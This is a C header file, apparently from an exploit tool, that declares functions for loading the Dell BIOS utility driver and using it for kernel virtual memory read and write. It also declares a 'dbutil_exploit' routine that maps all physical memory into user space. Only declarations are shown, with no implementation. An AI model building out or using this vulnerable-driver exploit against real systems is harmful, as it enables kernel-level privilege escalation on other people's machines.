#pragma once

#include "global.h"

void dbutil_removeDevice();

BOOL dbutil_startDriver();
HANDLE dbutil_loadDevice();
void dbutil_unloadDevice();

// Note: MmMapIoSpace cannot map Page Table, so reading/writing physcial memory is useless because the target is Page Table

// Virtual Kernel Memory Read Primitive
BOOL dbutil_read(_In_ HANDLE hDevice, _In_ DWORD64 address, _Out_ void* buffer, _In_ size_t bytesToRead);

// Virtual Kernel Memory Write Primitive
BOOL dbutil_write(_In_ HANDLE hDevice, _In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite);

// Use Dell Bios Util driver read/write virtual memory to map all physical memory in to user space
BOOL dbutil_exploit(HANDLE hDevice, ULONG64 eprocessVa, ULONG64* pDirectoryBase, ULONG64* pPphysicalMapVa);
